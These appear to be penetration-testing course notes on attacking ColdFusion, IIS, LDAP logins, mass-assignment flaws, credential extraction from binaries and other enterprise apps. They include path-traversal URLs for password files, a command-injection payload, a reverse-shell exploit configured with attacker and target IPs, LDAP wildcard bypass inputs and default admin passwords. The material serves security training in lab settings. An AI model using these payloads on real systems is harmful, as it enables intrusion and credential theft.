## 1-ColdFusion - Discovery & Enumeration

- **ColdFusion**: Java-based web app platform by **Adobe**
- **Language**: CFML (tag-based, HTML-like)
- **Uses**: Dynamic web apps, APIs, DB integration (MySQL, MSSQL, Oracle)
- **Key CFML tags**:
    - `<cfquery>` → execute SQL  .an  example connect to db
```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>

```
 - `<cfloop>` → iterate results
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
- **Features**:
    - Email, PDF, graphs, AJAX, session handling
    - Supports Java & JavaScript
- **Deployment**:
    - Runs on Windows / Linux / macOS
    - Supports cloud (AWS, Azure)
- **Benefits**:
    - Rapid development
    - Easy DB integration
    - Good performance & scalability
- **Versions**:
    - Latest: **CF 2021**
    - Others: 2018, 2016, 11

- **Common Vulnerabilities**:
 1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

- **Default Ports:**
    - 80 / 443 → HTTP / HTTPS
    - 8500 → SSL
    - 5500 → Server Monitor (admin)
    - 1935 → RPC
    - 25 → SMTP
#### Enumeration
During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:
- **Ports**: 80, 443 (detectable via Nmap)
- **Extensions**: `.cfm`, `.cfc`
- **Headers**: `Server` / `X-Powered-By: ColdFusion`
- **Errors**: CFML tags in messages
- **Default Files**: `/admin.cfm`, `/CFIDE/administrator/`
##### NMap ports and service scan results
```bash
nmap -p- -sC -Pn 10.129.247.30 --open 
 # 135/tcp   open  msrpc
 # 8500/tcp  open  fmtp
 # 49154/tcp open  unknown
```
**Open Port**: **8500** (ColdFusion SSL)

Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.
![[Pasted image 20251223193058.png]]
- **Conclusion**: ColdFusion running on port **8500**

Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.
![[Pasted image 20251223193130.png]]
The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.
![[Pasted image 20251223193149.png]]


---
## 2- Attacking ColdFusion
**Identified Version**: ColdFusion **8**, let Search for known public exploits
`searchsploit:`  Searches Exploit-DB locally
```bash
searchsploit adobe coldfusion
  # Adobe ColdFusion - Directory Traversal  | multiple/remote/14641.py
  # Adobe ColdFusion 8 - Remote Command Execution (RCE)  | cfm/webapps/50057.py
```
**Results**: 
  - **Directory Traversal**
  - **Remote Command Execution (RCE)**
#### Directory Traversal
Directory / Path Traversal : Read arbitrary files outside web root (configs, creds, system files)
- **Cause**: Poor input validation in CFML file-handling tags `CFDIRECTORY`, `CFFILE`
- **Traversal Payload**:`../` sequences to escape directories
**example:**
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```
`cfdirectory` lists files from `uploads/`
No validation on`directory` parameter → traversal possible
```bash
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```


`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks in `Adobe ColdFusion 9.0.1` and `earlier versions` by manipulating the `locale parameter (?locale=en)` in these specific ColdFusion files.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`
example:
```bash
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```
**exploit:** 
```bash
searchsploit Adobe ColdFusion  
  # Adobe ColdFusion - Directory Traversal - multiple/remote/14641.py
searchsploit -m multiple/remote/14641.py  
python2 14641.py 
  # usage: 14641.py <host> <port> <file_path>
```
**password.properties** in `ColdFusion8/lib/password.properties` : Stores **encrypted credentials** for: Databases,  Mail servers ,  LDAP, The file is usually in the `[cf_root]/lib` directory
##### Coldfusion - Exploitation
```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
As we can see, the contents of the `password.properties` file have been retrieved, proving that this target is vulnerable to `CVE-2010-2861`.
#### Unauthenticated RCE
unauthenticated Remote Code Execution , execute arbitrary commands **without login**, let to Full system compromise
**example:** 
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```
- User input (`cgi.query_string`) is executed directly via `cfexecute` without validation
- No authentication required → attacker can execute arbitrary system commands
exploit example:
```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

**exploit:** 
```bash
searchsploit Adobe ColdFusion  
  # Adobe ColdFusion 8 - Remote Command Execution (RCE) cfm/webapps/50057.py
searchsploit -m cfm/webapps/50057.py
```
**Exploit Modification**
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
##### Exploitation
```bash
python3 50057.py 
  # get reverse shell 
```


---

## 3- IIS Tilde Enumeration 

- **IIS Tilde Enumeration**: Technique to discover hidden files/folders on **Microsoft IIS**
- **Cause**: Windows **8.3 short filename** support
- **8.3 Format**: `FILENAME~N.EXT` (8 chars + `~` + number + 3-char extension)
- **Why it works**:
    - IIS allows access via short names
    - Hidden or restricted resources may still be reachable
- **Tilde (~)**:
    - Used in URLs to test short names
- **Enumeration method**:
    - Send requests like:
        - `/~a`, `/~b`, `/~c`
    - **200 OK** ⇒ valid short name prefix
    - Keep adding characters to refine (`/~se`, `/~sec`)
- **Example**:
    - Hidden dir: `SecretDocuments` ->  is the real file path
`http://example.com/~s`, the server replies with a `200 OK` status code
```http
http://example.com/~sf
http://example.com/~sg
http://example.com/~se   # returns a 200 OK status code

http://example.com/~sed
http://example.com/~see
http://example.com/~sec   # returns a 200 OK status code
...
```
Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a `200 OK` status code for the request `http://example.com/~secret`.
- Short name found: `secret~1`
- **Access hidden file content**:
The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory

    - `/secret~1/file.txt` -> is the real file path
    - `/secret~1/somefi~1.txt` -> short file path
- **File numbering**:
    - `~1`, `~2`, etc. distinguish similar names
    - Example:
        - `somefile.txt` → `somefi~1.txt`
        - `somefile1.txt` → `somefi~2.txt`

#### Enumeration
The initial phase involves mapping the target and determining which services are operating on their respective ports.
```bash
nmap -p- -sV -sC --open 10.129.224.91
  # 80/tcp open  http    Microsoft IIS httpd 7.5
```
IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.
##### Tilde Enumeration using IIS ShortName Scanner
Fortunately, there is a tool called [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). that can automate this task , you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. [How to Install Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)
```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```
Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit `GET` access to `http://10.129.204.231/TRANSF~1.ASP`, necessitating the brute-forcing of the remaining filename.
##### Generate Wordlist
```bash
# <WORD_LIST_PATH:transf....>   -->  transf...
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' | sort -u  > /tmp/list.txt
```
##### Gobuster Enumeration
```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
  # /transf**.aspx        (Status: 200) [Size: 941]
```
From the redacted output, you can see that `gobuster` has successfully identified an `.aspx` file as the full filename corresponding to the previously discovered short name `TRANSF~1.ASP`.


---

## 4- LDAP
- **Protocol** for accessing/managing directory info (users, groups, devices)
- **Ports**: 389 (LDAP), 636 (LDAPS/SSL)
- **Features**: Fast queries, hierarchical, extensible, cross-platform, auth support (bind, SASL, SSO)
- **Use cases**: Auth (SSO), Authorisation, Directory services, Sync
- **Vulnerabilities**: LDAP injection, no encryption by default
- **Implementations**: OpenLDAP (open-source), Active Directory (Windows)
- **Flow**: Client → Request (bind/search/modify) → Server → Response → Disconnect
- **LDAP vs AD**: LDAP = protocol, AD = Windows directory service using LDAP
##### ldapsearch
- **Purpose**: CLI tool to query LDAP directories
- **Command**:
```bash
ldapsearch -H ldap://server:port -D "bindDN" -w password -b "baseDN" "(filter)"
```
- **Params**: `-H` server, `-D` bind DN, `-w` password, `-b` base DN, `(filter)` search filter
- **Response**: Shows matching DN + attributes
- **Example**:
```bash
dn: uid=jdoe,ou=people,dc=example,dc=com
cn: John Doe
mail: john.doe@example.com
result: 0 Success
```
#### LDAP Injection
- **What**: Attack on apps using LDAP auth/queries
- **Goal**: Bypass authentication, read/modify directory data
- **Similar to**: SQL Injection (but targets LDAP)

**Common Injection Characters**
- `*` → wildcard (match anything)
- `()` → group expressions
- `|` → OR
- `&` → AND
- Examples: `(cn=*)`, `(objectClass=*)` → always tru

For example, suppose an application uses the following LDAP query to authenticate users:
```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
LDAP injection occurs when user input is not properly sanitized in LDAP queries. By injecting the `*` wildcard into the `username` or `password` fields, an attacker can bypass authentication.

if an attacker injects the `*` character into the `$username` field, the LDAP query will match any user account with any password. This would allow the attacker to gain access to the application with any password, as shown below:
```php
$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
Alternatively, if an attacker injects the `*` character into the `$password` field, the LDAP query would match any user account with any password that contains the injected string. This would allow the attacker to gain access to the application with any username, as shown below:
```php
$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

**Mitigation:** Always **validate and sanitize user input**, remove LDAP special characters (like `*`), and use **parameterized LDAP queries** so input is treated as data, not executable logic.
#### Enumeration
- **Goal**: Identify open ports, services, versions
- **Tool**: `nmap` service scan (`-sC -sV`)
- **Value**: Finds attack surface & possible vulns
```bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
  # 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
  # 80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
```
- `80/tcp` → HTTP (Apache 2.4.41)
- `389/tcp` → LDAP (OpenLDAP)
- **Conclusion**: Target runs **web + LDAP services**
#### Injection
As `OpenLDAP` runs on the server, it is safe to assume that the web application running on port `80` uses LDAP for authentication.
![[Pasted image 20251225223236.png]]
Attempting to log in using a wildcard character (`*`) in the username and password fields grants access to the system, effectively `bypassing any authentication measures that had been implemented`. This is a `significant` security issue as it allows anyone with knowledge of the vulnerability to `gain unauthorised access` to the system and potentially sensitive data.


---

## 5- Web Mass Assignment Vulnerabilities

Several frameworks offer handy mass-assignment features to lessen the workload for developers. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or database. This feature is often used without a whitelist for protecting the fields from the user's input. This vulnerability could be used by an attacker to steal sensitive information or destroy data.

Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.

Ruby on Rails is a web application framework that is vulnerable to this type of attack. The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. Assuming we have a `User` model with the following attributes:
```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```
The above model specifies that only the `username` and `email` attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Let's assume that the server receives the following parameters.
```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```
Although the `User` model does not explicitly state that the `admin` attribute is accessible, the attacker can still change it because it is present in the arguments. Bypassing any access controls that may be in place, the attacker can send this data as part of a POST request to the server to establish a user with admin privileges.

#### Exploiting Mass Assignment Vulnerability
Suppose we come across the following application that features an Asset Manager web application. Also suppose that the application's source code has been provided to us. Completing the registration step, we get the message `Success!!`, and we can try to log in.

![Login form with fields for username, password, 'Remember Me' checkbox, and 'Forgot Your Password?' link.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/mass_assignment/pending.png)
After login in, we get the message `Account is pending approval`. The administrator of this web app must approve our registration. Reviewing the python code of the `/opt/asset-manager/app.py` file reveals the following snippet.
```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```
We can see that the application is checking if the value `k` is set. If yes, then it allows the user to log in. In the code below, we can also see that if we set the `confirmed` parameter during registration, then it inserts `cond` as `True` and allows us to bypass the registration checking step.
```python
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')
```
In that case, what we should try is to register another user and try setting the `confirmed` parameter to a random value. Using Burp Suite, we can capture the HTTP POST request to the `/register` page and set the parameters `username=new&password=test&confirmed=test`.

![Intercepted HTTP POST request to /register with username and password parameters.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/mass_assignment/mass_hidden.png)
We can now try to log in to the application using the `new:test` credentials.
![3D arrows labeled Profit, Risk, and Loss intersecting.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/mass_assignment/loggedin.png)
The mass assignment vulnerability is exploited successfully and we are now logged into the web app without waiting for the administrator to approve our registration request.


#### Prevention

To prevent this type of attack, one should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned. The following example shows how to use strong parameters in the `User` controller.

Code: ruby

```ruby
class UsersController < ApplicationController
  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render 'new'
    end
  end

  private

  def user_params
    params.require(:user).permit(:username, :email)
  end
end
```
In the example above, the `user_params` method returns a new hash that includes only the `username` and `email` attributes, ignoring any more input the client may have sent. By doing this, we ensure that only explicitly permitted attributes can be changed by mass assignment.


---
## 6- Attacking Applications Connecting to Services
Applications that are connected to services often include connection strings that can be leaked if they are not protected sufficiently. In the following paragraphs, we will go through the process of enumerating and exploiting applications that are connected to other services in order to extend their functionality. This can help us collect information and move laterally or escalate our privileges during penetration testing.

#### ELF Executable Examination
The `octopus_checker` binary is found on a remote machine during the testing. Running the application locally reveals that it connects to database instances in order to verify that they are available.
```shell-session
[!bash!]$ ./octopus_checker 

Program had started..
Attempting Connection 
Connecting ... 

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
connected
```
The binary probably connects using a SQL connection string that contains credentials. Using tools like [PEDA](https://github.com/longld/peda) (Python Exploit Development Assistance for GDB) we can further examine the file. This is an extension of the standard GNU Debugger (GDB), which is used for debugging C and C++ programs. GDB is a command line tool that lets you step through the code, set breakpoints, and examine and change variables. Running the following command we can execute the binary through it.
```shell-session
[!bash!]$ gdb ./octopus_checker

GNU gdb (Debian 9.2-1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./octopus_checker...
(No debugging symbols found in ./octopus_checker)
```
Once the binary is loaded, we set the `disassembly-flavor` to define the display style of the code, and we proceed with disassembling the main function of the program.
```assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

Dump of assembler code for function main:
   0x0000555555555456 <+0>:	endbr64 
   0x000055555555545a <+4>:	push   rbp
   0x000055555555545b <+5>:	mov    rbp,rsp
 
 <SNIP>
 
   0x0000555555555625 <+463>:	call   0x5555555551a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x000055555555562a <+468>:	mov    rdx,rax
   0x000055555555562d <+471>:	mov    rax,QWORD PTR [rip+0x299c]        # 0x555555557fd0
   0x0000555555555634 <+478>:	mov    rsi,rax
   0x0000555555555637 <+481>:	mov    rdi,rdx
   0x000055555555563a <+484>:	call   0x5555555551c0 <_ZNSolsEPFRSoS_E@plt>
   0x000055555555563f <+489>:	mov    rbx,QWORD PTR [rbp-0x4a8]
   0x0000555555555646 <+496>:	lea    rax,[rbp-0x4b7]
   0x000055555555564d <+503>:	mov    rdi,rax
   0x0000555555555650 <+506>:	call   0x555555555220 <_ZNSaIcEC1Ev@plt>
   0x0000555555555655 <+511>:	lea    rdx,[rbp-0x4b7]
   0x000055555555565c <+518>:	lea    rax,[rbp-0x4a0]
   0x0000555555555663 <+525>:	lea    rsi,[rip+0xa34]        # 0x55555555609e
   0x000055555555566a <+532>:	mov    rdi,rax
   0x000055555555566d <+535>:	call   0x5555555551f0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@plt>
   0x0000555555555672 <+540>:	lea    rax,[rbp-0x4a0]
   0x0000555555555679 <+547>:	mov    edx,0x2
   0x000055555555567e <+552>:	mov    rsi,rbx
   0x0000555555555681 <+555>:	mov    rdi,rax
   0x0000555555555684 <+558>:	call   0x555555555329 <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs>
   0x0000555555555689 <+563>:	lea    rax,[rbp-0x4a0]
   0x0000555555555690 <+570>:	mov    rdi,rax
   0x0000555555555693 <+573>:	call   0x555555555160 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt>
   0x0000555555555698 <+578>:	lea    rax,[rbp-0x4b7]
   0x000055555555569f <+585>:	mov    rdi,rax
   0x00005555555556a2 <+588>:	call   0x5555555551d0 <_ZNSaIcED1Ev@plt>
   0x00005555555556a7 <+593>:	cmp    WORD PTR [rbp-0x4b2],0x0

<SNIP>

   0x0000555555555761 <+779>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x0000555555555765 <+783>:	leave  
   0x0000555555555766 <+784>:	ret    
End of assembler dump.
```
This reveals several call instructions that point to addresses containing strings. They appear to be sections of a SQL connection string, but the sections are not in order, and the endianness entails that the string text is reversed. Endianness defines the order that the bytes are read in different architectures. Further down the function, we see a call to SQLDriverConnect.
```assembly
   0x00005555555555ff <+425>:	mov    esi,0x0
   0x0000555555555604 <+430>:	mov    rdi,rax
   0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
   0x000055555555560c <+438>:	add    rsp,0x10
   0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
```
Adding a breakpoint at this address and running the program once again, reveals a SQL connection string in the RDX register address, containing the credentials for a local database instance.
```assembly
gdb-peda$ b *0x5555555551b0

Breakpoint 1 at 0x5555555551b0


gdb-peda$ run

Starting program: /htb/rollout/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x0 
RCX: 0xfffffffd 
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')

<SNIP>
```
`RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")`
Apart from trying to connect to the MS SQL service, penetration testers can also check if the password is reusable from users of the same network.
#### DLL File Examination
A DLL file is a `Dynamically Linked Library` and it contains code that is called from other programs while they are running. The `MultimasterAPI.dll` binary is found on a remote machine during the enumeration process. Examination of the file reveals that this is a .Net assembly.
```powershell-session
C:\> Get-FileMetaData .\MultimasterAPI.dll

<SNIP>
M .NETFramework,Version=v4.6.1 TFrameworkDisplayName.NET Framework 4.6.1    api/getColleagues        ! htt
p://localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast
<SNIP>
```
Using the debugger and .NET assembly editor [dnSpy](https://github.com/0xd4d/dnSpy), we can view the source code directly. This tool allows reading, editing, and debugging the source code of a .NET assembly (C# and Visual Basic). Inspection of `MultimasterAPI.Controllers` -> `ColleagueController` reveals a database connection string containing the password.
![Code editor showing MultimasterAPI with methods Get and GetColleagues, including SQL connection string.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/apps_conn_to_services/dnspy_hidden.png)
Apart from trying to connect to the MS SQL service, attacks like password spraying can also be used to test the security of other services

---

## 7- Other Notable Applications

Though this module focuses on nine specific applications, there are still many different ones that we may encounter in the wild. I have performed large penetration tests where I ended up with an over 500-page EyeWitness report to go through.

The module was designed to teach a methodology that can be applied to all other applications we may encounter. The list of applications we covered in this module covers the main functions and most of the objectives of the vast number of individual applications to increase the effectiveness of your internal and external assessments during your penetration tests.

We covered enumerating the network and creating a visual representation of the applications within a network to ensure maximum coverage. We also covered a variety of ways that we can attack common applications, from fingerprinting and discovery to abusing built-in functionality and known public exploits. The aim of the sections on osTicket and GitLab was not only to teach you how to enumerate and attack these specific applications but also to show how support desk ticketing systems and Git repository applications may yield fruit that can be useful elsewhere during an engagement.

A big part of penetration testing is adapting to the unknown. Some testers may run a few scans and become discouraged when they don't see anything directly exploitable. If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios. Ensure that you understand the various techniques taught for footprinting these applications and the curiosity to explore an unknown application. You will come across applications not listed in this module. Similar to what I did with the Nexus Repository OSS application in the introduction section, you can apply these principles to find issues like default credentials and built-in functionality leading to remote code execution.
#### Honorable Mentions
That being said, here are a few other applications that we have come across during assessments and are worth looking out for:

|Application|Abuse Info|
|---|---|
|[Axis2](https://axis.apache.org/axis2/java/core/)|This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) in the form of an AAR file (Axis2 service file). There is also a Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) that can assist with this.|
|[Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server)|Websphere has suffered from many different [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.|
|[Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch)|Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen [this](https://www.exploit-db.com/exploits/36337) before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) features Elasticsearch.|
|[Zabbix](https://en.wikipedia.org/wiki/Zabbix)|Zabbix is an open-source system and network monitoring solution that has had quite a few [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box [Zipper](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) showcases how to use the Zabbix API to gain RCE.|
|[Nagios](https://en.wikipedia.org/wiki/Nagios)|Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version.|
|[WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)|WebLogic is a Java EE application server. At the time of writing, it has 190 reported [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.|
|Wikis/Intranets|We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.|
|[DotNetNuke](https://en.wikipedia.org/wiki/DNN_\(software\))|DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe [issues](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.|
|[vCenter](https://en.wikipedia.org/wiki/VCenter)|vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) that scanners like Nessus do not pick up. This [unauthenticated OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) vulnerability was disclosed in early 2021, and a PoC for [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise.|
Once again, this is not an exhaustive list but just more examples of the many things we may come across in a corporate network. As shown here, often, a default password and built-in functionality are all we need.

